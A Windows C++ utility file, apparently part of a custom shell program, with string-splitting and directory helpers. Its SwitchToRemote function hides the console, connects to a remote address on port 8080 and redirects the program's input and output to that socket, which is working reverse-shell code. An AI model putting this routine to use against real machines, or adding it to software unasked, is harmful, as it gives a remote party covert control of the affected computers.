#include "shellutil.h"
#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#include <iostream>
#include <io.h>
#include <fcntl.h>
#include "herrors.h"

#pragma comment (lib, "Ws2_32.lib")
#pragma comment (lib, "Mswsock.lib")
#pragma comment (lib, "AdvApi32.lib")

#define PORT "8080"

#define NETERROR(msg) {\
                           AllocConsole(); \
                           std::cerr << (msg) << " Error: " << GetErrorMessage(WSAGetLastError()) << std::endl; \
                           WSACleanup(); \
                      }

// connects to remote server and directs standard input, output and errors to it
void SwitchToRemote(char* address)
{
	// called here so console won't hang while connecting to server
	FreeConsole();

	HANDLE hTargetProcess = NULL;
	HANDLE hModule = NULL;
	DWORD dwBytesRead = 0;
	DWORD dwTargetProcessID = GetCurrentProcessId();

	struct addrinfo* result = NULL, hints;

	// Initialize Winsock
	WSADATA wsaData;
	int iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
	if (iResult != 0) {
		AllocConsole();
		ERROR_CODE("Unable to intialize Winsock.", iResult);
		return;
	}

	ZeroMemory(&hints, sizeof(hints));
	hints.ai_family = AF_INET;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;

	// Resolve the server address
	iResult = getaddrinfo(address, PORT, &hints, &result);
	if (iResult != 0) {
		NETERROR("Unable to resolve server address.");
		return;
	}

	// Create socket
	SOCKET clientSocket = WSASocketW(result->ai_family, result->ai_socktype, result->ai_protocol, NULL, NULL, NULL);
	if (clientSocket == INVALID_SOCKET) {
		NETERROR("Unable to create socket.");
		return;
	}

	// Connect to the server
	if (connect(clientSocket, result->ai_addr, (int)result->ai_addrlen) == SOCKET_ERROR) {
		closesocket(clientSocket);
		NETERROR("Unable to connect to server.");
		return;
	}

	// convert the socket descriptor to a file handle that is compatible with the standard I/O functions
	int sockfd = _open_osfhandle(
		clientSocket,
		_O_TEXT
	);

	if (sockfd == -1)
	{
		closesocket(clientSocket);
		NETERROR("_open_osfhandle(..) convertion has failed.");
		return;
	}

	// direct stdin, stdout and stderr
	_dup2(sockfd, _fileno(stdin));
	_dup2(sockfd, _fileno(stdout));
	_dup2(sockfd, _fileno(stderr));
}

std::vector<std::string> split(std::string args, char seperator) {
	std::vector<std::string> vec;
	std::string word;

	args += " ";

	for (size_t i = 0; i < args.length(); i++) {
		if (args[i] == seperator) {
			vec.push_back(word);
			word = "";
		}
		else
		{
			word += args[i];
		}
	}

	return vec;
}

std::string GetProcessDirectory()
{
	CHAR buffer[MAX_PATH];
	if (GetCurrentDirectoryA(MAX_PATH, buffer) == 0) {
		LERROR("Unable to get the current direcotry.");
		return "";
	}

	return std::string(buffer);
}

std::string ToUpperCase(std::string str) {
	std::string result;
	for (char c : str) {
		result += std::toupper(c);
	}
	return result;
}